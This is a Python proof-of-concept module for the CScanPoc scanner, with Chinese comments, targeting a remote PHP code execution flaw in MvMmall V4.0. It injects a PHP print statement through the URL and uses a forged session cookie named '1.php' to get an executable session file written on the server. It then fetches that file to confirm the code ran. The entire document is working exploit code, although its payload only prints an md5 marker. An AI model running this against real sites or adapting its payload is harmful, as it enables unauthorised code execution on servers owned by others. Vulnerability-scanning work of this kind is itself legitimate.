# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'MvMmall_0000'  # 平台漏洞编号，留空
    name = 'MvMmall V4.0远程任意PHP代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-12-16'  # 漏洞公布时间
    desc = '''
        MvMmall V4.0远程任意PHP代码执行,通过构造特殊的参数，可生成.php文件，并可写入php代码。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=080042'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MvMmall'  # 漏洞应用名称
    product_version = '4.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3f0d30d5-74fa-4dc3-a511-ccbd4cace32c'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + "/index.php?<?print(md5(0x22))?>"
            data = {
                'Cookie': 'sessionID=1.php;PHPSESSIN=1.php;'
            }
            _res = requests.get(url, headers=data)

            checkURL = arg + "/union/data/session/mvm_sess_1.php"
            code1, head1, res1, errcode1, finalurl1 = hh.http(checkURL)
            if res1.find("e369853df766fa44e1ed0ff613f563bd") != -1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
